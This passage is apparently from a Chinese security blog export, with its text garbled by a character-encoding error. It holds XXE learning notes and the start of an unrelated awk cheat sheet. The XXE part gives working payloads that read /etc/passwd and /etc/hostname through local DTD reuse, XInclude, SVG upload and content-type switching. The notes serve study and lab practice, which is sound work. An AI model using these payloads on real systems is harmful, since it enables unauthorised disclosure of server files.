<h4 id="é€šè¿‡é‡æ–°åˆ©ç”¨æœ¬åœ°-DTD-æ¥åˆ©ç”¨ç›²-XXE"><a href="#é€šè¿‡é‡æ–°åˆ©ç”¨æœ¬åœ°-DTD-æ¥åˆ©ç”¨ç›²-XXE" class="headerlink" title="é€šè¿‡é‡æ–°åˆ©ç”¨æœ¬åœ° DTD æ¥åˆ©ç”¨ç›² XXE"></a>é€šè¿‡é‡æ–°åˆ©ç”¨æœ¬åœ° DTD æ¥åˆ©ç”¨ç›² XXE</h4><p>ä¸Šè¿°æŠ€æœ¯é€‚ç”¨äºå¤–éƒ¨ DTDï¼Œä½†é€šå¸¸ä¸é€‚ç”¨äº DOCTYPE å…ƒç´ ä¸­å®Œå…¨æŒ‡å®šçš„å†…éƒ¨ DTDã€‚è¿™æ˜¯å› ä¸ºè¯¥æŠ€æœ¯æ¶‰åŠåœ¨å¦ä¸€ä¸ªå‚æ•°å®ä½“çš„å®šä¹‰ä¸­ä½¿ç”¨ XML å‚æ•°å®ä½“ã€‚æ ¹æ® XML è§„èŒƒï¼Œè¿™åœ¨å¤–éƒ¨ DTD ä¸­æ˜¯å…è®¸çš„ï¼Œä½†åœ¨å†…éƒ¨ DTD ä¸­æ˜¯ä¸å…è®¸çš„ã€‚ï¼ˆæœ‰äº›è§£æå™¨å¯èƒ½ä¼šå®¹å¿è¿™ç§æƒ…å†µï¼Œä½†è®¸å¤šè§£æå™¨åˆ™ä¸ä¼šã€‚ï¼‰</p>
<p>é‚£ä¹ˆï¼Œå½“å¸¦å¤–äº¤äº’è¢«é˜»æ­¢æ—¶ï¼Œç›² XXE æ¼æ´ä¼šæ€æ ·å‘¢ï¼Ÿæ— æ³•é€šè¿‡å¸¦å¤–è¿æ¥æ³„éœ²æ•°æ®ï¼Œä¹Ÿæ— æ³•ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½å¤–éƒ¨ DTDã€‚</p>
<p>å¦‚æœæ–‡æ¡£çš„ DTD ä½¿ç”¨å†…éƒ¨å’Œå¤–éƒ¨ DTD å£°æ˜çš„æ··åˆï¼Œåˆ™å†…éƒ¨ DTD å¯ä»¥é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨ DTD ä¸­å£°æ˜çš„å®ä½“ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼Œåœ¨å¦ä¸€ä¸ªå‚æ•°å®ä½“çš„å®šä¹‰ä¸­ä½¿ç”¨ XML å‚æ•°å®ä½“çš„é™åˆ¶ä¼šæ”¾å®½ã€‚</p>
<p>æœ¬è´¨ä¸Šï¼Œæ”»å‡»æ¶‰åŠè°ƒç”¨æ°å¥½å­˜åœ¨äºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ DTD æ–‡ä»¶å¹¶é‡æ–°åˆ©ç”¨å®ƒä»¥è§¦å‘åŒ…å«æ•æ„Ÿæ•°æ®çš„è§£æé”™è¯¯çš„æ–¹å¼é‡æ–°å®šä¹‰ç°æœ‰å®ä½“</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Š &#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd ä½ç½®æœ‰ä¸€ä¸ª DTD æ–‡ä»¶ï¼Œå¹¶ä¸”æ­¤ DTD æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªåä¸º custom_entity çš„å®ä½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤å¦‚ä¸‹æ··åˆ DTD æ¥è§¦å‘åŒ…å« &#x2F;etc&#x2F;passwd æ–‡ä»¶å†…å®¹çš„ XML è§£æé”™è¯¯æ¶ˆæ¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/local/app/schema.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">custom_entity</span> <span class="string">&#x27;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&amp;#x25;eval;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&amp;#x25;error;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl"><span class="variable">%local_dtd</span>;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>å®šä¹‰ä¸€ä¸ªåä¸º local_dtd çš„ XML å‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šå­˜åœ¨çš„å¤–éƒ¨ DTD æ–‡ä»¶çš„å†…å®¹ã€‚<br>é‡æ–°å®šä¹‰åä¸º custom_entity çš„ XML å‚æ•°å®ä½“ï¼Œè¯¥å®ä½“å·²åœ¨å¤–éƒ¨ DTD æ–‡ä»¶ä¸­å®šä¹‰ã€‚è¯¥å®ä½“è¢«é‡æ–°å®šä¹‰ä¸ºåŒ…å«å·²æè¿°çš„åŸºäºé”™è¯¯çš„ XXE æ¼æ´ï¼Œç”¨äºè§¦å‘åŒ…å« &#x2F;etc&#x2F;passwd æ–‡ä»¶å†…å®¹çš„é”™è¯¯æ¶ˆæ¯ã€‚<br>ä½¿ç”¨ local_dtd å®ä½“ï¼Œä»¥ä¾¿è§£é‡Šå¤–éƒ¨ DTDï¼ŒåŒ…æ‹¬ custom_entity å®ä½“çš„é‡æ–°å®šä¹‰å€¼ã€‚è¿™ä¼šäº§ç”Ÿæ‰€éœ€çš„é”™è¯¯æ¶ˆæ¯ã€‚<br>è½¬ä¹‰åçš„çœŸå®å«ä¹‰ï¼š</p>
<table>
<thead>
<tr>
<th>è½¬ä¹‰å†™æ³•</th>
<th>å¯¹åº”å­—ç¬¦</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;#x25;</code></td>
<td>%</td>
<td>ç”¨äºå®šä¹‰å‚æ•°å®ä½“ï¼ˆå¦‚ %fileï¼‰</td>
</tr>
<tr>
<td><code>&amp;#x26;</code></td>
<td>&amp;</td>
<td>è½¬ä¹‰åçš„ &amp;ï¼Œç”¨äºåç»­åµŒå¥—å®ä½“å®šä¹‰</td>
</tr>
<tr>
<td><code>&amp;#x27;</code></td>
<td>â€˜</td>
<td>å•å¼•å·ï¼Œç”¨äºåŒ…è£¹å­—ç¬¦ä¸²é¿å…ä¸å¤–å›´å¼•å·å†²çª</td>
</tr>
</tbody></table>
<p><code>&amp;#x26;#x25;</code>æ˜¯åŒé‡è½¬ä¹‰ï¼Œå› ä¸ºè¿™ä¸€è¡Œä»£ç é‡Œ<code>&amp;#x25;</code>å·²ç»è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å…ˆè½¬ç§»å‡ºä¸€ä¸ª<code>&amp;</code>å†å’Œåé¢æ‹¼æ¥ï¼Œè½¬ä¹‰å‡ºä¸€ä¸ª<code>%</code><br>ç”±äºæ­¤ XXE æ”»å‡»æ¶‰åŠé‡æ–°åˆ©ç”¨æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ç°æœ‰ DTDï¼Œå› æ­¤å…³é”®è¦æ±‚æ˜¯æ‰¾åˆ°åˆé€‚çš„æ–‡ä»¶ã€‚è¿™å®é™…ä¸Šéå¸¸ç®€å•ã€‚ç”±äºåº”ç”¨ç¨‹åºä¼šè¿”å› XML è§£æå™¨æŠ›å‡ºçš„ä»»ä½•é”™è¯¯æ¶ˆæ¯ï¼Œå› æ­¤åªéœ€å°è¯•ä»å†…éƒ¨ DTD ä¸­åŠ è½½å®ƒä»¬å³å¯è½»æ¾æšä¸¾æœ¬åœ° DTD æ–‡ä»¶ã€‚<br>ä¾‹å¦‚ï¼Œä½¿ç”¨ GNOME æ¡Œé¢ç¯å¢ƒçš„ Linux ç³»ç»Ÿé€šå¸¸æœ‰ä¸€ä¸ª DTD æ–‡ä»¶ &#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd å¯ä»¥é€šè¿‡æäº¤ä»¥ä¸‹ XXE payload æ¥æµ‹è¯•æ­¤æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶ç¼ºå¤±ï¼Œå°†å¯¼è‡´é”™è¯¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl"><span class="variable">%local_dtd</span>;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>æµ‹è¯•äº†å¸¸è§ DTD æ–‡ä»¶åˆ—è¡¨ä»¥æ‰¾åˆ°å­˜åœ¨çš„æ–‡ä»¶åï¼Œéœ€è¦è·å–è¯¥æ–‡ä»¶çš„å‰¯æœ¬å¹¶æŸ¥çœ‹å®ƒä»¥æ‰¾åˆ°å¯ä»¥é‡æ–°å®šä¹‰çš„å®ä½“ã€‚ç”±äºè®¸å¤šåŒ…å« DTD æ–‡ä»¶çš„å¸¸è§ç³»ç»Ÿéƒ½æ˜¯å¼€æºçš„ï¼Œå› æ­¤é€šå¸¸å¯ä»¥é€šè¿‡äº’è”ç½‘æœç´¢å¿«é€Ÿè·å–æ–‡ä»¶å‰¯æœ¬ã€‚</p>
<p>æ¯”å¦‚ä½¿ç”¨GNOME æ¡Œé¢ç¯å¢ƒçš„ç³»ç»Ÿé€šå¸¸æœ‰ä¸€ä¸ª DTD &#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd åŒ…å«ä¸€ä¸ªåä¸º ISOamso.<br><img src="https://pic1.imgdb.cn/item/67c12c9ad0e0a243d407b5af.png"></p>
<h3 id="å¯»æ‰¾-XXE-æ³¨å…¥çš„éšè—æ”»å‡»é¢"><a href="#å¯»æ‰¾-XXE-æ³¨å…¥çš„éšè—æ”»å‡»é¢" class="headerlink" title="å¯»æ‰¾ XXE æ³¨å…¥çš„éšè—æ”»å‡»é¢"></a>å¯»æ‰¾ XXE æ³¨å…¥çš„éšè—æ”»å‡»é¢</h3><p>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼ŒXXE æ³¨å…¥æ¼æ´çš„æ”»å‡»é¢å¾ˆæ˜æ˜¾ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºçš„æ­£å¸¸ HTTP æµé‡åŒ…æ‹¬åŒ…å« XML æ ¼å¼æ•°æ®çš„è¯·æ±‚ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæ”»å‡»é¢ä¸å¤ªæ˜æ˜¾ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ åœ¨æ­£ç¡®çš„åœ°æ–¹å¯»æ‰¾ï¼Œä½ ä¼šåœ¨ä¸åŒ…å«ä»»ä½• XML çš„è¯·æ±‚ä¸­æ‰¾åˆ° XXE æ”»å‡»é¢ã€‚</p>
<h4 id="XInclude-attacks-XInclude-æ”»å‡»"><a href="#XInclude-attacks-XInclude-æ”»å‡»" class="headerlink" title="XInclude attacks  XInclude æ”»å‡»"></a>XInclude attacks  XInclude æ”»å‡»</h4><p>ä¸€äº›åº”ç”¨ç¨‹åºæ¥æ”¶å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œåœ¨æœåŠ¡å™¨ç«¯å°†å…¶åµŒå…¥ XML æ–‡æ¡£ï¼Œç„¶åè§£æè¯¥æ–‡æ¡£ã€‚ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯æäº¤çš„æ•°æ®è¢«æ”¾å…¥åç«¯ SOAP è¯·æ±‚ä¸­ï¼Œç„¶åç”±åç«¯ SOAP æœåŠ¡è¿›è¡Œå¤„ç†ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ æ— æ³•è¿›è¡Œç»å…¸çš„ XXE æ”»å‡»ï¼Œå› ä¸º æ— æ³•æ§åˆ¶æ•´ä¸ª XML æ–‡æ¡£ï¼Œ XInclude æ— æ³•å®šä¹‰æˆ–ä¿®æ”¹ DOCTYPE å…ƒç´ ã€‚ä½†æ˜¯ï¼Œ å¯èƒ½èƒ½å¤Ÿæ”¹ç”¨ XInclude æ˜¯ XML è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå…è®¸ä»å­æ–‡æ¡£æ„å»º XML æ–‡æ¡£ã€‚ å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­çš„ä»»ä½•æ•°æ®å€¼ä¸­æ”¾ç½® XInclude æ”»å‡»ï¼Œå› æ­¤å¯ä»¥åœ¨ ä»…æ§åˆ¶æ”¾ç½®åœ¨æœåŠ¡å™¨ç«¯ XML æ–‡æ¡£ä¸­çš„å•ä¸ªæ•°æ®é¡¹çš„æƒ…å†µä¸‹æ‰§è¡Œæ”»å‡»ã€‚<br>è¦æ‰§è¡Œ XInclude æ”»å‡»ï¼Œ éœ€è¦å¼•ç”¨ XInclude å‘½åç©ºé—´å¹¶æä¾›è¦åŒ…å«çš„æ–‡ä»¶çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:<span class="attribute">xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><br><span class="line">&lt;xi:include <span class="attribute">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div>
<p>XInclude æ˜¯ W3C æ ‡å‡†ï¼Œå…è®¸ XML æ–‡æ¡£åŒ…å«å…¶ä»–èµ„æºï¼ˆæœ¬åœ°æ–‡ä»¶ã€è¿œç¨‹ URL ç­‰ï¼‰çš„å†…å®¹ã€‚<br>parse&#x3D;â€textâ€ï¼šå°†ç›®æ ‡èµ„æºå†…å®¹è§†ä¸ºçº¯æ–‡æœ¬ï¼ˆè€Œé XMLï¼‰ï¼Œç›´æ¥åµŒå…¥å½“å‰æ–‡æ¡£ã€‚<br>hrefï¼šæŒ‡å®šè¦åŒ…å«çš„èµ„æºè·¯å¾„ï¼ˆå¦‚ file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdï¼‰ã€‚<br><img src="https://pic1.imgdb.cn/item/67c13026d0e0a243d407bbed.png"><br>æ¯”å¦‚è¿™é‡Œç”¨æˆ·å¯ä»¥è¾“å…¥çš„æ˜¯productIdï¼Œå°±åœ¨è¿™é‡Œæ’å…¥XIncludeï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ XInclude ä¼šå°è¯•å°†åŒ…å«çš„æ–‡æ¡£è§£æä¸º XMLã€‚ç”±äº &#x2F;etc&#x2F;passwd ä¸æ˜¯æœ‰æ•ˆçš„ XMLï¼Œå› æ­¤éœ€è¦å‘ XInclude æŒ‡ä»¤æ·»åŠ é¢å¤–çš„å±æ€§æ¥æ›´æ”¹æ­¤è¡Œä¸ºã€‚è¿™é‡Œå°±æ˜¯æŒ‡å®š<code>parse=&quot;text&quot;</code>å°†ç›®æ ‡æ–‡ä»¶è§†ä¸ºçº¯æ–‡æœ¬è€Œé XML</p>
<h4 id="é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ-XXE-æ”»å‡»"><a href="#é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ-XXE-æ”»å‡»" class="headerlink" title="é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ XXE æ”»å‡»"></a>é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ XXE æ”»å‡»</h4><p>ä¸€äº›åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œå¤„ç†ã€‚ä¸€äº›å¸¸è§çš„æ–‡ä»¶æ ¼å¼ä½¿ç”¨ XML æˆ–åŒ…å« XML å­ç»„ä»¶ã€‚åŸºäº XML çš„æ ¼å¼çš„ç¤ºä¾‹åŒ…æ‹¬åŠå…¬æ–‡æ¡£æ ¼å¼ï¼ˆå¦‚ DOCXï¼‰å’Œå›¾åƒæ ¼å¼ï¼ˆå¦‚ SVGï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶åœ¨ä¸Šä¼ ååœ¨æœåŠ¡å™¨ä¸Šå¤„ç†æˆ–éªŒè¯è¿™äº›å›¾ç‰‡ã€‚å³ä½¿åº”ç”¨ç¨‹åºå¸Œæœ›æ¥æ”¶ PNG æˆ– JPEG ç­‰æ ¼å¼ï¼Œæ‰€ä½¿ç”¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒ SVG å›¾åƒã€‚ç”±äº SVG æ ¼å¼ä½¿ç”¨ XMLï¼Œæ”»å‡»è€…å¯ä»¥æäº¤æ¶æ„çš„ SVG å›¾åƒï¼Œä»è€Œè¾¾åˆ° XXE æ¼æ´çš„éšè—æ”»å‡»é¢ã€‚</p>
<p>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c1338bd0e0a243d407bfff.png"><br>è¿™é‡Œå°±æ˜¯åœ¨ä¸Šä¼ å¤´åƒè¿™é‡Œæ”¯æŒsvgæ–‡ä»¶ï¼Œä¼ å…¥payloadä¹‹åï¼Œå°±èƒ½åœ¨è¯„è®ºåŒºçœ‹åˆ°è‡ªå·±çš„å¤´åƒäº†ï¼Œå¤´åƒä¸½çš„å†…å®¹å°±æ˜¯&#x2F;etc&#x2F;hostnameäº†<br><img src="https://pic1.imgdb.cn/item/67c133f0d0e0a243d407c014.png"></p>
<h4 id="é€šè¿‡ä¿®æ”¹å†…å®¹ç±»å‹è¿›è¡Œ-XXE-æ”»å‡»"><a href="#é€šè¿‡ä¿®æ”¹å†…å®¹ç±»å‹è¿›è¡Œ-XXE-æ”»å‡»" class="headerlink" title="é€šè¿‡ä¿®æ”¹å†…å®¹ç±»å‹è¿›è¡Œ XXE æ”»å‡»"></a>é€šè¿‡ä¿®æ”¹å†…å®¹ç±»å‹è¿›è¡Œ XXE æ”»å‡»</h4><p>å¤§å¤šæ•° POST è¯·æ±‚ä½¿ç”¨ç”± HTML è¡¨å•ç”Ÿæˆçš„é»˜è®¤å†…å®¹ç±»å‹ï¼Œä¾‹å¦‚ application&#x2F;x-www-form-urlencoded ã€‚ä¸€äº›ç½‘ç«™å¸Œæœ›æ¥æ”¶è¿™ç§æ ¼å¼çš„è¯·æ±‚ï¼Œä½†ä¹Ÿèƒ½å®¹å¿å…¶ä»–å†…å®¹ç±»å‹ï¼ŒåŒ…æ‹¬ XMLã€‚<br>æ­£å¸¸è¯·æ±‚çš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">foo</span><span class="operator">=</span>bar</span></span><br></pre></td></tr></table></figure></div>
<p>å¯èƒ½èƒ½å¤Ÿæäº¤ä»¥ä¸‹è¯·æ±‚ï¼Œå¹¶è·å¾—ç›¸åŒçš„ç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>bar<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœåº”ç”¨ç¨‹åºå®¹å¿æ¶ˆæ¯æ­£æ–‡ä¸­åŒ…å« XML çš„è¯·æ±‚ï¼Œå¹¶å°†æ­£æ–‡å†…å®¹è§£æä¸º XMLï¼Œé‚£ä¹ˆåªéœ€é‡æ–°æ ¼å¼åŒ–è¯·æ±‚ä»¥ä½¿ç”¨ XML æ ¼å¼å³å¯åˆ°è¾¾éšè—çš„ XXE æ”»å‡»é¢ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯æ‰€æœ‰å…³äºxxeæ¼æ´çš„å†…å®¹äº†ï¼Œæ›´å¤šæŠ€å·§è¿˜éœ€è¦åœ¨åšé¢˜æˆ–è€…å®æˆ˜ä¸­å­¦ä¹ ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxæŒ‡ä»¤ç¬”è®°</title>
    <url>/posts/49809.html</url>
    <content><![CDATA[<p>é¶åœºæˆ–è€…å¹³æ—¶é‡åˆ°çš„linuxæŒ‡ä»¤è®°å½•</p>
<span id="more"></span>
<h1 id="Linux-å¸¸ç”¨æŒ‡ä»¤ç¬”è®°"><a href="#Linux-å¸¸ç”¨æŒ‡ä»¤ç¬”è®°" class="headerlink" title="Linux å¸¸ç”¨æŒ‡ä»¤ç¬”è®°"></a>Linux å¸¸ç”¨æŒ‡ä»¤ç¬”è®°</h1><h2 id="awk-æ–‡æœ¬å¤„ç†å·¥å…·"><a href="#awk-æ–‡æœ¬å¤„ç†å·¥å…·" class="headerlink" title="&#x3D;&#x3D;awk&#x3D;&#x3D; æ–‡æœ¬å¤„ç†å·¥å…·"></a>&#x3D;&#x3D;awk&#x3D;&#x3D; æ–‡æœ¬å¤„ç†å·¥å…·</h2><p><strong>åŠŸèƒ½</strong>ï¼šé€è¡Œå¤„ç†æ–‡æœ¬ï¼Œè‡ªåŠ¨åˆ†å‰²å­—æ®µï¼ˆé»˜è®¤ä»¥ç©ºæ ¼&#x2F;Tabåˆ†éš”ï¼‰</p>
<h3 id="æ ¸å¿ƒå˜é‡"><a href="#æ ¸å¿ƒå˜é‡" class="headerlink" title="æ ¸å¿ƒå˜é‡"></a>æ ¸å¿ƒå˜é‡</h3><table>
<thead>
<tr>
<th>å˜é‡</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>æ•´è¡Œå†…å®¹</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>ç¬¬ä¸€åˆ—</td>
</tr>
<tr>
<td><code>$2</code></td>
<td>ç¬¬äºŒåˆ—</td>
</tr>
<tr>
<td><code>...</code></td>
<td>â€¦</td>
</tr>
<tr>
<td><code>$NF</code></td>
<td>æœ€åä¸€åˆ—</td>
</tr>
<tr>
<td><code>$NR</code></td>
<td>è¡Œæ•° ï¼ˆå¯ä»¥åˆ¤æ–­æ—¶å€™ç”¨ æ¯”å¦‚$NR %2 =&#x3D;0</td>
</tr>
</tbody></table>
<h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-F</code></td>
<td>æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>æŒ‡å®šå¤–éƒ¨è„šæœ¬æ–‡ä»¶</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>ä¼ é€’å¤–éƒ¨å˜é‡åˆ°awkè„šæœ¬</td>
</tr>
</tbody></table>
<h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨é€—å·åˆ†éš”ç¬¦ï¼Œæ‰“å°ç¬¬äºŒåˆ—</span></span><br><span class="line"><span class="attribute">awk</span> -F <span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;</span> filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æœ€åä¸€åˆ—å’Œæ•´è¡Œ</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print <span class="variable">$NF</span>, <span class="variable">$0</span>&#125;&#x27;</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¡ä»¶å¤„ç†ï¼ˆæ‰“å°ç¬¬ä¸€åˆ—å¤§äº10çš„è¡Œï¼‰</span></span><br><span class="line">awk <span class="string">&#x27;<span class="variable">$1</span> &gt; 10 &#123;print <span class="variable">$0</span>&#125;&#x27;</span> data.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#æå–æ¯ä¸€è¡Œçš„æœ€åä¸€ä¸ªå­—ç¬¦ å¹¶ä¸”å»æ‰æ¢è¡Œ</span></span><br><span class="line">cat a.txt | awk <span class="string">&#x27;&#123;print substr(<span class="variable">$0</span>,length(<span class="variable">$0</span>)-1,1)&#125;&#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure></div>
